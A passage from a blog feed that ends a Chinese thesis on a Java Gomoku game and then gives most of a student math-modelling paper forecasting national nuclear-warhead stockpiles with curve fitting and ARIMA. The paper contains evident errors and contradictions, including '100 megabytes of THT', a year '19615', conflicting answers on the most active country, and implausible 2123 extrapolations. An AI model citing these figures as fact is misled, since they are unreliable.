style="zoom: 80%;" /><center>图4-1 开始界面</center><p>五子棋游戏系统的棋盘与棋子绘制如下图4-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Java语言的五子棋游戏\绘画界面.jpg" style="zoom:80%;" /><center>图4-2 绘画界面</center><h4 id="5-2-胜利判定及系统提示">5.2 胜利判定及系统提示</h4><p>五子棋游戏系统的胜利判定以及系统提示如下图4-3所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Java语言的五子棋游戏\游戏胜利.jpg" style="zoom:80%;" /><center>图4-3 游戏胜利</center><h3 id="6-总结">6 总结</h3><p>本文对基于Java语言的五子棋游戏系统进行开发，其中进行了详细的设计，对其功能进行了实现并且进行了功能测试。这里面主要包括对五子棋游戏背景的研究，对游戏规则进行的分析与系统设计，游戏界面的设计，人机功能的实现，还有实现后的测试和优化。</p><p>本文先对五子棋游戏的规则进行了深度的解析，这其中包括棋盘的样式，棋子的数量，落子规则和胜负判断等，这为后续的游戏系统开发打下了坚实的基础。随后作者基于Java语言设计了五子棋游戏的图形用户界面，棋盘的绘制，落子的合法判定，胜利、平局判定，游戏系统提示等，以便用户能够舒适地体验游戏。除此之外，作者还设计了人机对战模式与先后手功能的选择。人机对战使得玩家可以与计算机进行对弈以提升棋技，同先后手功能的选择共同增加了游戏的趣味与挑战性。</p><p>五子棋游戏设计完成后，作者对其进行测试与优化，对其中尚有欠缺的地方进行优化，以提升游戏的用户体验与性能表现。</p><p>虽然本文实现了基于Java语言的五子棋游戏的一定功能，但仍然还存在可以优化的地方。比如对AI下棋算法进行优化，实现人机对战中难度的选择，还可以新增添提示功能，让玩家不知道该怎么下棋时，由AI计算出最佳落子点。</p><p>综上所述，本在基于Java语言的五子棋游戏上取得了一定的成果，但还有可以改进的地方，今后可以对该游戏系统进行深入的研究与优化，以提升玩家的游戏体验。</p><h3 id="参考文献">参考文献</h3><p>[1] 张国芳.Java编程语言在计算机软件开发中的应用方向分析[J].信息记录料,2023,24(11):138-141.</p><p>[2] 刘瑞. 五子棋人工智能算法设计与实现[D].华南理工大学,2013:5-15.</p><p>[3] 车志宏，吕峰.基于α-β剪枝算法的五子棋游戏设计与实现[J].电脑编程技巧与维护,2024(04):131-133+153.</p><p>[4] 院旺.消除五子连珠情况的策略研究[J].科教文汇(上旬刊),2018(04):61-62.</p><p>[5] 李程，胡五音.Jav，a编程语言在计算机软件开发中的应用[J].电子技术,2024,53(03):66-67．</p><p>[6] 韩小龙,司珍,吕晓峰,等.基于面向对象编程的Java语言程序设计方法分析[J].集成电路应用,2024,41(01):228-229．</p><p>[7] 赵旭东.计算机软件开发与设计中Java语言的应用研究[J].信息与电脑(理论版),2023,35(24):31-33．</p><p>[8] 陈雪荣，岳书丹.基于Java的五子棋游戏的设计与实现[J].信息系统工程,2020(08):104-105.</p><p>[9] 曹风云，赵卫华.基于Java的五子棋博弈平台研究[J].重庆工商大学学报(自然科学版),2021,38(02):10-15．</p><p>[10] 何星，段华琼.基于C语言的五子棋游戏的设计与实现[J].信息与电脑(理论版),2021,33(24):118-120.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基于java语言的五子棋游戏&quot;&gt;基于Java语言的五子棋游戏&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;摘要&lt;/strong&gt;：五子棋作为起源于中国的古老游戏，兼顾老少皆宜与增强思维能力的优点，是一种需要两方参与的纯策略型棋类游戏。游戏规则大致为双方各执一色棋子，在空棋盘开</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="毕业论文" scheme="https://shierjinghuang.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/"/>
    
    <category term="JAVA" scheme="https://shierjinghuang.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>2022年美赛数学建模</title>
    <link href="https://shierjinghuang.github.io/2024/03/31/2022%E5%B9%B4%E7%BE%8E%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    <id>https://shierjinghuang.github.io/2024/03/31/2022%E5%B9%B4%E7%BE%8E%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</id>
    <published>2024-03-30T23:59:57.000Z</published>
    <updated>2025-03-31T06:57:40.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-APMCM-summary-sheet"><a href="#2022-APMCM-summary-sheet" class="headerlink" title="2022 APMCM summary sheet"></a>2022 APMCM summary sheet</h1><p>​        Because of the terrible power of nuclear weapons, many countries hope to use it to deter other countries and protect themselves from foreign invasion. Based on nuclear weapons  development data of various countries over the years, this paper analyzes and predicts the  change trend of nuclear weapons in the future, and establishes the lethality model to calculate  the destructive capability of nuclear weapons. The following analysis is carried out for each  problem. </p><p>​        For the first problem, firstly, the data is preprocessed, and the obtained data is drawn into  line charts and bar charts for descriptive analysis and visual analysis. Then, the entropy weight  method is used to calculate the weights of the variables of status, tests and stockpile, which are  0.0422,0.9198 and 0.0380, respectively. The country that is most active in nuclear weapons  research is calculated according to the weights obtained. </p><p>​        For the second problem, first of all, the number of nuclear weapons in the whole country  is obtained through data processing. Then, the relationship between the storage number and the year is found by fitting. After repeated adjustment, the coefficient of determination of each  fitting result is no less than 0.8, and the relationship between the year and the number of  nuclear weapons of each country and the whole world is obtained. The fitting model is  established to predict the number of nuclear weapons. In order to increase the accuracy of the  prediction results, the ARIMA(p, d, q) prediction model is established to predict the number of  nuclear weapons in the future and the countries that may possess nuclear weapons in the  future. Due to the international situation, it is understood that South Africa has voluntarily given up the development of nuclear weapons, so the forecast data does not include South  Africa. </p><p>​        For the third problem, the lethal model of the detonation location of nuclear weapons is  first established, which is described from two aspects: the killing power of blast wave and the  degree of nuclear radiation damage. The effective killing distance and area are calculated  according to the nuclear bomb killing formula, and the blast shock wave overpressure peak  value is calculated by using the empirical formula of spherical charge explosion in infinite air  medium. The killing radius corresponding to different impact damage levels is obtained and  the explosion wave power model is established. The degree of nuclear radiation damage mainly depends on the sum of neutron and γ radiation dose absorbed by human body. Then,  the model is used to calculate the damage range of “Big Ivan” nuclear bomb with 100  megabytes of THT equivalent and the number of destroyed earth. It can be seen that the  number of existing nuclear bombs cannot destroy the earth. Finally, taking 10% of land damage as the limit of total nuclear warheads, the number of nuclear warheads destroyed by a  large country is taken as the maximum number of nuclear warheads possessed by a nuclear  country. </p><p><strong>Key words</strong>: entropy weight method, fitting, time series model</p><h1><center>Contents </center></h1>[TOC]<h2 id="1-Problem-background-and-restatement"><a href="#1-Problem-background-and-restatement" class="headerlink" title="1 Problem background and restatement"></a>1 Problem background and restatement</h2><h3 id="1-1-Problem-background"><a href="#1-1-Problem-background" class="headerlink" title="1.1 Problem background"></a>1.1 Problem background</h3><p>​        Nuclear weapon refers to the huge deadly weapons related to nuclear reaction, including  hydrogen bomb, atomic bomb, neutron bomb, etc. It is one of the most powerful weapons  developed by human beings and has a terrible power. Therefore, many countries hope to use it  to deter other countries and protect their own countries from foreign invasion. After World  War II, all countries in the world began to frantically develop and manufacture atomic bombs,  “Big Ivan” is now the world’s known most powerful nuclear bomb. Many people believe that  nuclear weapons can destroy the Earth many times over by affecting the living conditions of  human beings on Earth. </p><h3 id="1-2-Problem-restatement"><a href="#1-2-Problem-restatement" class="headerlink" title="1.2 Problem restatement"></a>1.2 Problem restatement</h3><p>​        Based on the above background, and on the basis of collecting data on nuclear weapons  development, research and development attitudes and policies of various countries over the  past years, the following questions are answered. </p><ol><li>A mathematical model is established and the relevant data are used for quantitative  analysis to identify the countries that possess nuclear weapons, the countries that have reduced  or increased their stockpiles the most in the past 20 years, the five years in which nuclear  weapons tests have occurred the most, the countries that have been the most active in nuclear  weapons research in the past decade, and the countries that have made the fastest transition  from “no consideration of nuclear weapons” to “possession of nuclear weapons”. </li><li> To build a mathematical model to predict the number of nuclear weapons, predict the  next 100 years of nuclear weapon states and the number of nuclear weapons, the total number  of nuclear weapons in 2123, the number of nuclear weapons in each country to change trends. </li><li>To build a mathematical model of the detonation location of nuclear weapons and  calculate the maximum destructive power of nuclear weapons. Estimate the minimum number  of nuclear bombsthat could destroy the planet, and determine whether the current total number  of nuclear bombs could destroy the planet. To protect the planet and the environment on which  we live, set limits on the total number of nuclear bombs in the world and the number of nuclear  bombs by nuclear states. </li></ol><h2 id="2-Problem-analysis"><a href="#2-Problem-analysis" class="headerlink" title="2 Problem analysis"></a>2 Problem analysis</h2><h3 id="2-1-Problem-one-analysis"><a href="#2-1-Problem-one-analysis" class="headerlink" title="2.1 Problem one analysis"></a>2.1 Problem one analysis</h3><p>​        According to the four tables of data on nuclear weapons of each country given in the  annex of the title, the change of each country’s position on nuclear weapons is analyzed. By  studying the stockpiles of nuclear warheads of each country in the past 78 years and comparing  the changes of nuclear warhead stockpiles of 10countries, the bar chart of the world’s annual  nuclear weapons tests in the past 78 years is drawn. And draw a broken line chart showing the  changing positions of countries that once possessed nuclear weapons on nuclear weapons.The  attachment data is preprocessed, the data in the form is analyzed by entropy weight method,and the status of each country, the number of tests, and the weight of stockpile changes are  calculated. </p><h3 id="2-2-Problem-two-analysis"><a href="#2-2-Problem-two-analysis" class="headerlink" title="2.2 Problem two analysis"></a>2.2 Problem two analysis</h3><p>​        The nuclear weapon reserves of the countries in the annex have been indicated in each  year, so it is necessary to predict the number of nuclear weapons in the future. The  establishment of a prediction model to calculate the number of nuclear weapons in a future  year according to the existing historical data belongsto the prediction problem. Due to the large  number of countries, it is particularly important to extract the relationship between the number  of nuclear weapons in each country and the year. Since the storage capacity changes with time,  the time series model is chosen here to predict the future storage capacity. </p><h3 id="2-3-Problem-three-analysis"><a href="#2-3-Problem-three-analysis" class="headerlink" title="2.3 Problem three analysis"></a>2.3 Problem three analysis</h3><p>​        In view of problem 3, firstly, the establishment of the lethal model of the detonation  location: firstly, we can directly establish the explosive wave power model from the power of  nuclear explosion itself, considering the effective killing range (area)generated by the shock  wave, the heat energy released and the peak overpressure of the explosion wave; Secondly, the  killing power of nuclear weapons can be described indirectly from the damage degree of  nuclear radiation to human body and environment. In a nuclear explosion, a large number of  neutrons and γ radiation are released, and the damage of nuclear radiation to human body  mainly depends on the sum of the neutrons and γ radiation absorbed. </p><p>​        Then, as for the choice of the TNT equivalent of nuclear bomb, considering the large  energy needed to destroy the earth, we chose “Big Ivan”, the largest TNT equivalent of  100M.Finally, in terms of the limitation of nuclear warheads, according to the data, it is  impossible to achieve zero nuclear warheads, so we can only choose to reduce the damage of  nuclear explosions to the earth and reduce the total number of nuclear warheads, and we  choose 10% of the land destruction area. For nuclear states, the role of nuclear bombs in  safeguarding national security should be considered. Therefore, the number of nuclear warheads destroyed by a large country is taken as the maximum number of nuclear warheads  possessed by a nuclear state. </p><h3 id="3-Problem-hypothesis"><a href="#3-Problem-hypothesis" class="headerlink" title="3 Problem hypothesis"></a>3 Problem hypothesis</h3><ol><li>Assume that all nuclear bombs in the world have a TNT equivalent of 100Mt. </li><li>Assume that the detonation of a nuclear bomb is instantaneous, disregarding the nuclear reaction process of the explosion. </li><li>Assume that the energy from a nuclear bomb explosion is all expressed in the form of  a shock wave and travels in a straight line. </li><li>Assume that the kill power of multiple nuclear bombs is equal to the sum of TNT  equivalent. </li><li>Assume that the nuclear explosion is a ground nuclear explosion, and the damage to the ground explosion is close to a circle. </li><li>Assume that the air density is standard air density 1.29kg/m. </li></ol><h2 id="4-Symbol-description"><a href="#4-Symbol-description" class="headerlink" title="4 Symbol description"></a>4 Symbol description</h2><p>​        In order to facilitate reading and understanding, the paper gives a unified explanation of  important variables, as shown in Tab. 4-1. </p><center>Tab.4-1 Symbol description </center>| Symbol | Description                  | Symbol | Description                     || ------ | ---------------------------- | ------ | ------------------------------- || SST    | Sum of the total squares     | p      | Regression term coefficients    || SSE    | Regression to sum of squares | q      | Sliding average number of items || SSR    | Sum of squared errors        | d      | Number of differences           |<h2 id="5-Model-and-solution-of-problem-one"><a href="#5-Model-and-solution-of-problem-one" class="headerlink" title="5 Model and solution of problem one"></a>5 Model and solution of problem one</h2><h3 id="5-1-a-preprocessing"><a href="#5-1-a-preprocessing" class="headerlink" title="5.1 a preprocessing"></a>5.1 a preprocessing</h3><p>​        For problem 1, first of all, check the data in the attachment, and use matlab programming  to check the following data anomalies: </p><ol><li>Whether there is a missing value; </li><li>Import the data into matlab to check for the presence of NaNso, to determine whether there are outliers. </li><li>Use the unique function to check and weed out a large number of duplicate values. After  calculation, there are no missing values, outliers, duplicate values in the attachment. </li></ol><h3 id="5-2-Descriptive-statistical-analysis"><a href="#5-2-Descriptive-statistical-analysis" class="headerlink" title="5.2 Descriptive statistical analysis"></a>5.2 Descriptive statistical analysis</h3><p>​        Question a requires to analyze the position form in the attachment of the topic, and summarize the data according to Status, 0 is none, l is Consideration, 2 is Pursuit, 3 is  Possession, and the conclusion can be reached: Russia, the United States, China, France, the  United Kingdom, Pakistan, India, Israel, North Korea and South Africa once possessed nuclear weapons. </p><p>​        According to question b, analyze the form in the attachment to obtain Tab.5-1.Nuclear  weapons change line Fig.5-1 is obtained by using matlab to draw according to data in form  Stockpiles. According to Tab.5-1 and Fig.5-1, it can be concluded that in the past 20 years,  nuclear weapons stockpile of United States has changed the most. The stockpile has decreased  by 6749. </p><center>Tab.5-1 Table of relative and absolute changesin estimated nuclear warhead stockpiles over the  past 20 years </center>| Country        | 2002      | 2022     | Absolute Change | Relative Change || -------------- | --------- | -------- | --------------- | --------------- || United States  | 10,457.00 | 3,708.00 | -6,749.00       | -65%            || Russia         | 10,114.00 | 4,477.00 | -5,637.00       | -56%            || United Kingdom | 280.00    | 180.00   | -100.00         | -36%            || France         | 350.00    | 290.00   | -60.00          | -17%            || South Africa   | 0.00      | 0.00     | +0.00           |                 || Israel         | 76.00     | 90.00    | 14.00           | +18%            || North Korea    | 0.00      | 20.00    | +20.00          |                 || China          | 235.00    | 350.00   | +115.00         | +49%            || India          | 23.00     | 160.00   | +137.00         | +596%           || Pakistan       | 26.00     | 165.00   | +139.00         | +535%           |<img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Nuclear weapons change line graph.png" style="zoom:50%;" /><center>Fig.5-1 Nuclear weapons change line graph </center>​        To solve question c, to analyze the data of the form Tests attached to the question and get  the number of nuclear weapons experiments conducted in the world every year. In order to get  the conclusion intuitively, the bar graph is drawn and the graph of the number of nuclear  weapons experiments from 1945 to 2019 is obtained. It can be concluded that in 1962, 1958,  1968, 1966, 1966 and 19615, nuclear weapon tests occurred the most, 178 times, 116 times, 79  times, 76 times and 71 times respectively. <img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/The graph of the number of nuclear weapon tests from 1945 to 2019.png" style="zoom:50%;" /><center>Fig.5-2 The graph of the number of nuclear weapon tests from 1945 to 2019 </center>​        According to question a, 10 countries that once possessed nuclear weapons have been  known. In order to facilitate the analysis of question e, 10 countries that once possessed  nuclear weapons given in the form Position in the attachment are analyzed and a broken line  chart is drawn, obtaining the positions of China and Israel on nuclear weapons in Fig5-3, India  and Pakistan on nuclear weapons in Fig5-4 and South Africa and North Korea on nuclear  weapons in Fig5-5. In the positions of countries on nuclear weapons in Fig5-3, Fig5-4 and  Fig5-5, 0 represents no consideration, 1 represents Consideration, 2 represents Pursuit and 3 represents Possession, and the transition year table from "no consideration of nuclear weapons"  to "possession of nuclear weapons" for each country in Tab.5-2 is obtained, and the United States can be seen the transition from "no consideration of nuclear weapons" to "possession of  nuclear weapons" is the fastest. <center>Tab.5-2 A table of countries' transition yearsfrom "no consideration of nuclear weapons "to "possession of nuclear weapons. </center>| country        | Does not consider | Possesses | Year difference || -------------- | ----------------- | --------- | --------------- || India          | 1947              | 1987      | 40              || Pakistan       | 1971              | 1987      | 16              || China          | 1951              | 1964      | 9               || Israel         | 1948              | 1967      | 19              || France         | 1944              | 1960      | 16              || United Kingdom | 1939              | 1952      | 13              || Russia         | 1941              | 1949      | 8               || United States  | 1938              | 1945      | 7               || South Africa   | 1968              | 1979      | 11              || North Korea    | 1961              | 2006      | 45              |<img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Chart of positions of China and Israel on nuclear weapons.png" style="zoom: 67%;" /><center>Fig.5-3 Chart of positions of China and Israel on nuclear weapons </center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/India and Pakistan's position on nuclear weapons.png" style="zoom: 67%;" /><center> Fig.5-4 India and Pakistan's position on nuclear weapons</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Position graph of nuclear weapons in South Africa and North Korea.png" style="zoom:67%;" /><center>Fig.5-5 Position graph of nuclear weapons in South Africa and North Korea </center>### 5.3 entropy weight method analyzes the research activity of nuclear weapons<p>To solve question d, we use the entropy weight method to analyze the weight of  variations, using status in the form Tests and stockpile in the form Position the. The principle is as follows: </p><ol><li>Standardize the data, so that the data is distributed between 0 and l. There is a formula  below. </li></ol><p>$$<br>\overline{a_{ij}} = \frac{a_{ij} - \mu_j}{s_j}<br>$$</p><p>​    where,<br>$$<br>𝜇_𝑗 = \frac{1}{n}\sum \limits <em>{i = 1}^n 𝑎</em>{𝑖𝑗}<br>$$</p><p>$$<br>𝑠_𝑗 = \sqrt {\frac{1}{n-1} \sum \limits <em>{i = 1}^n {(a</em>{𝑖𝑗}− 𝜇_𝑗)^2}}<br>$$</p><ol start="2"><li><p>Calculate the information entropy of each index according to the definition of information entropy in information theory, the information entropy of a group of data is below.<br>$$<br>𝐸<em>j= − ln(𝑛) ^{-1}\sum \limits <em>{i = 1}^n 𝑝</em>{𝑖𝑗}ln 𝑝</em>{𝑖𝑗}<br>$$<br>where,<br>$$<br>𝑝_{𝑖𝑗}= \frac{𝑌_{𝑖𝑗}}{\sum \limits _{i = 1}^n 𝑌_𝑦 }<br>$$</p></li><li><p>Finally determine the weight of each index. </p><p>The entropy weight method obtains its Status, the number of Tests, and the Stockpile variation with the weight of 0.0422,0.9198, 0.0380. Calculate it by weight PRK is the most active, and conclude that in the past decade, Russia has been the most active in nuclear weapons research. </p></li></ol><h2 id="6-Model-and-solution-of-problem-two"><a href="#6-Model-and-solution-of-problem-two" class="headerlink" title="6 Model and solution of problem two"></a>6 Model and solution of problem two</h2><h3 id="6-1-Data-preprocessing"><a href="#6-1-Data-preprocessing" class="headerlink" title="6.1 Data preprocessing"></a>6.1 Data preprocessing</h3><p>​        For problem 2, we first conduct pre-processing and check for attachment data Stockpile: whether there are missing values, duplicate values, outlier values, etc. In order to reduce the error, we set the data years from 1945 to 2022 as 1 to 78.And calculate the comparison table of the world’s years and nuclear weapons reserves, as shown in Tab.6-1. </p><center>Tab.6-1Comparison table of years and nuclear weaponsreserves in the world </center>| Year | Stockpile || ---- | --------- || 1    | 2         || 2    | 9         || 3    | 13        || 4    | 50        || …    | …         || 75   | 9325      || 76   | 9330      || 77   | 9458      || 78   | 9440      |<p>​        No missing data or abnormal data has been found after examination for Stockpile. The data Stockpile of each country is relatively complete with a wide range of years and high reliability of data. </p><h3 id="6-2-Problem-2-Model-establishment"><a href="#6-2-Problem-2-Model-establishment" class="headerlink" title="6.2 Problem 2 Model establishment"></a>6.2 Problem 2 Model establishment</h3><p>​        The data is the reserves of nuclear weapons, and the data dimension is relatively low. The year and reserves comparison table of each country can be fitted with the data.The principle of  linear fitting is as follows. </p><ol><li><p>The least square method is used to find the fitting equation of the number of annual nuclear weapons in each country and the world.<br>$$<br>𝑦 = 𝑘̂𝑥 + 𝑏̂<br>$$</p><p>$$<br>𝑘̂ = \frac{ n\sum \limits _{i = 1}^n 𝑥_𝑖 𝑦_𝑖 -\sum \limits _{i = 1}^n 𝑦_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>{ n \sum \limits _{i = 1}^n 𝑥_𝑖^2 − \sum \limits _{i = 1}^n 𝑥_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>$$</p><p>$$<br>𝑏̂ = \frac{ \sum \limits _{i = 1}^n 𝑦_𝑖\sum \limits _{i = 1}^n x_i^2 -\sum \limits _{i = 1}^n x_i𝑦_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>{ n \sum \limits _{i = 1}^n 𝑥_𝑖^2 − \sum \limits _{i = 1}^n 𝑥_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>$$</p></li></ol><p>After the fitting equation is obtained, the goodness of fit of the equation is obtained by using the formula to judge  the fitting effect. When the goodness of fit is close to 1, the fitting effect is better.<br>$$<br>𝑆𝑆𝐸 = \sum \limits _{i = 1}^n {(y_i− 𝑦̂)^2}<br>$$</p><p>$$<br>𝑆𝑆𝑇 = \sum \limits _{i = 1}^n (𝑦_𝑖 − 𝑦̅) ^2<br>$$</p><p>$$<br>𝑆𝑆𝑅 = \sum \limits _{i = 1}^n(𝑦̂_i − 𝑦̅ ) ^2<br>$$</p><p>$$<br>0 ≤ 𝑅^2 = \frac {𝑆𝑆𝑅} {𝑆𝑆𝑇} = \frac{𝑆𝑆𝑇 − 𝑆𝑆𝐸} { 𝑆𝑆𝑇} = 1 − \frac {𝑆𝑆𝐸} {𝑆𝑆𝑇} ≤ 1<br>$$</p><p>For question a, we establish a time series model and solve the model. </p><p><strong>Step 1: Data stationarity test</strong> </p><p>​        Firstly, using Matlab to test the data stationarity. If the data of different countries are found  to be less stable after being brought in, the difference of the original data is taken, and then the  test is carried out until it passes the test. Because there are many countries, we takes China as an  example here, as shown in Fig.6-1.</p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Variance analysis diagram of China.png" style="zoom:50%;" /><center>Fig. 6-1 Variance analysis diagram of China </center>**Step 2: Determine the model parameters** <p>​        The model parameters p, q and d were determined by autocorrelation function(ACF) and  partial autocorrelation function(PACF) based on the stabilized data. Where d isthe difference  order, p, q are determined by the order of the following equation using AIC and BIC criteria  through matlab.<br>$$<br>X_𝒕 = 𝒄 + a_𝟏 X_{𝒕−𝟏} + 𝜶<em>𝟐 X</em>{𝒕−𝟐} + ⋯ + 𝜶<em>𝒑 X</em>{𝒕−𝒑} + 𝜺<em>𝒕 + 𝜷_𝟏 𝜺</em>{𝒕−𝟏} + ⋯ + 𝜷<em>𝒒 𝜺</em>{𝒕−𝒒}<br>$$<br>The autocorrelation and partial autocorrelation graphs drawn by matlab are shown in Fig.6-2. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Autocorrelation and partial autocorrelation pictures of China.png" style="zoom:67%;" /><center>Fig.6-2 Autocorrelation and partial autocorrelation pictures of China </center>**Step 3: Model construction** <p>​        Matlab and its own prediction tool are used to construct and predict the model and Fig. 6-3  is obtained:</p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/China's time series model prediction chart.png" style="zoom: 60%;" /><center>Fig. 6-3 China's time series model prediction chart </center>### 6.3 Solution of Problem 2 model<p>​        Step 1: For question b, the relationship between the number and year of nuclear weapons in  the country and the world can be obtained by using fitting calculation, as shown in Fig.6-4 to  Fig.6-10. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of China and France.png" style="zoom: 60%;" /><center>Fig. 6-4 Number and Year fitting graph of nuclear weapons of China and France </center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of India and Israel.png" style="zoom:60%;" /><center>Fig.6-5 Number and Year fitting graph of nuclear weapons of India and Israel</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of North Korea and Pakistan.png" style="zoom:60%;" /><center>Fig.6-6 Number and Year fitting graph of nuclear weapons of North Korea and Pakistan</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of Russia and the United Kingdom.png" style="zoom:60%;" /><center>Fig.6-7 Number and Year fitting graph of nuclear weapons of Russia and the United Kingdom</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of the United States and the World.png" style="zoom:60%;" /><center>Fig.6-8 Number and Year fitting graph of nuclear weapons of the United States and the World </center>**The corresponding formula for China is:** $$y = 1.758589586213E − 04𝑥^4 − 2.865922062910𝐸 − 02𝑥^3 + 1.480494595983𝐸 + 00𝑥^2 − 2.075941202614𝐸 + 01𝑥 + 5.980836621847𝐸 + 01$$**The corresponding formula for France is:** $$y = 1.090228106461E − 05𝑥^5 − 1.952155699827𝐸 − 03𝑥^4 + 1.128467098749𝐸 − 01𝑥^3 − 2.222112809877𝐸 + 00𝑥^2 + 1.446885471555𝐸 + 01𝑥 − 2.055355206383𝐸 + 01 $$**The corresponding formula for India is:** $$y = 7.054782608696E + 00x − 3.868930434783E + 02 $$**The corresponding formula for Israel is:** $$y = 1.448564094134E + 00x − 1.776956376956E + 01 $$**The corresponding formula for North Korea is:** $$y = 6.673948873745E − 10𝑥^6 + 1.402428079896𝐸 − 07𝑥^5 − 3.304782580804𝐸 − 05𝑥^4 + 2.028431954671𝐸03𝑥^3 − 4.903423282672𝐸 − 02𝑥^2 + 4.403173966551𝐸 − 01 − 9.591027132012𝐸 − 01 $$**The formula for Pakistan is:** $$y = 7.356153846154E + 00x − 3.989461538462E + 02$$**The corresponding formula for Russia is:** $$y = −2.066025970539E − 04𝑥^5 + 8.395634338470𝐸 − 02𝑥^4 − 9.974565977602𝐸 + 00𝑥^3 + 4.501570472946𝐸 + 02𝑥^2 − 6.887059684175𝐸 + 03𝑥 + 3.024866446426𝐸 + 04 $$**The corresponding formula for United Kingdom is:** $$y = 1.062000638735E − 02𝑥^3 − 1.640238161541𝐸 + 00𝑥^2 + 7.461626511325𝐸 + 01𝑥 − 6.374009978584𝐸 + 02 $$**The corresponding formula for United States is:** $$y = 4.970163822984E − 01𝑥^3 − 7.685975917203𝐸 + 01𝑥^2 + 3.205357479012𝐸 + 03𝑥 − 1.444184629055𝐸 + 04 $$<p><strong>The formula for World is:</strong><br>$$<br>y = −3E − 05𝑥^6 + 0.3048𝑥^5 − 1508.4𝑥^4 + 4𝐸 + 06𝑥^3 − 6𝐸 + 09𝑥^2 + 5𝐸 + 12𝑥 − 2𝐸 + 15<br>$$<br>​        By substituting the number corresponding to the year 2123 into each formula, we can get  the number of nuclear weapons in China, France, India, Israel, North Korea, Pakistan, Russia,  United Kingdom and United States: 58183, 577920, 876, 242, 23938, 918, 4.23864e+006, 21074, 947211. </p><p>​        Through linear fitting, the number of nuclear weapons of each country and the world in  the next 100 years can be preliminarily predicted. In order to further reduce the error and  improve the accuracy, the time series model is used to solve the model. </p><p>​        For question a, ARIMA(p, d, q) model is selected. p, d and q parameters are determined,  and d-order backward difference is calculated. </p><p>$$<br>∇<em>𝑑 𝑌_𝑡=∇</em>{𝑑−1} 𝑌<em>𝑡 − ∇_𝑑 𝑌</em>{𝑡−1} = (1 − 𝐵) ∇_{𝑑−1} 𝑌_𝑡 = ⋯ = (1 − 𝐵)^𝑑𝑌_𝑡<br>$$<br>The arima formula calculated. </p><p>$$<br>((1 − \sum \limits _{i = 1}^p ∅_𝑖 𝐵^𝑖)(1 − 𝐵)^𝑑 𝑌_𝑖 = (1 + \sum \limits _{i = 1}^q 𝜃_𝑖 𝐵^𝑖) 𝜀_𝑖 ↔ (1 − 𝐵)^𝑑 𝑌_𝑖 − \sum \limits _{i = 1}^p ∅𝑖(1 − 𝐵)^𝑑 Y^{𝑡−𝑖} = \sum \limits <em>{i = 1}^q 𝜃_𝑖 𝜀</em>{𝑖−1} +𝜀_𝑖)<br>$$<br>​        Build the model, use the time prediction model tool in spsspro to get the prediction  results, and make the test set more than 90% correct. Finally, the following results are obtained  by importing the data. </p><center>Tab.6-2 Predicted values and goodness of fit of reserves of countries and the world </center>| Country   | China  | France | India  | Israel | Russia || --------- | ------ | ------ | ------ | ------ | ------ || Stockpile | 999.84 | 600.9  | 1277.6 | 218.8  | 2535.5 || R²        | 0.982  | 0.98   | 0.996  | 0.998  | 0.998  |<table><thead><tr><th>Country</th><th>North Korea</th><th>United Kingdom</th><th>United States</th><th>World</th></tr></thead><tbody><tr><td>Stockpile</td><td>45.9</td><td>1128</td><td>1691</td><td>59788</td></tr><tr><td>R²</td><td>0.857</td><td>0.958</td><td>0.992</td><td>0.979</td></tr></tbody></table><p>​        Step 2: Analyze and process the attached data position, and use the time series prediction  model to solve the nuclear weapon states in 100 years. Due to the large amount of data, the  data of ten countries that already know the situation of nuclear weapons are first removed, and  then the status of all countries from 1938 to 2022 are removed, and the 19 countries that are  most likely to possess nuclear weapons in the next 100 years are obtained. Then, the time series model is used to predict the status development of each country in 100 years, and the Tab.6-3  is shown as follows: </p><center>Tab.6-3 Predicted status values and goodness of fit for each country after 100 years </center>| Country     | Forest               | R²    || ----------- | -------------------- | ----- || Algeria     | 0.0898981745892814   | 0.766 || Argentina   | 0.12342365117639151  | 0.826 || Australia   | 0.34926806354026124  | 0.859 || Egypt       | 0                    | 0.889 || Germany     | 0.09465938322576074  | 0.609 || Indonesia   | 0.045994603387985986 | 0.643 || Iran        | 4.3809523809523725   | 0.945 || Iraq        | 0.2600939120120171   | 0.856 || Syria       | 2.172                | 0.913 || Switzerland | 0                    | 0.886 || Sweden      | 0                    | 0.888 || South Korea | 0.25                 | 0.866 || Serbia      | 0.440760108943       | 0.783 || Romania     | 0. 117644254         | 0.814 || Norway      | 0                    | 0.845 || Libya       | 0                    | 0.90  || Japan       | 0.119                | 0.624 || Italy       | 0.04547              | 0.713 |<p>​        We can see that Iran is most likely to have nuclear weapons 100 years from now, so the  countries that have nuclear weapons 100 years from now are Iran, Russia, the United States,  China, France, the 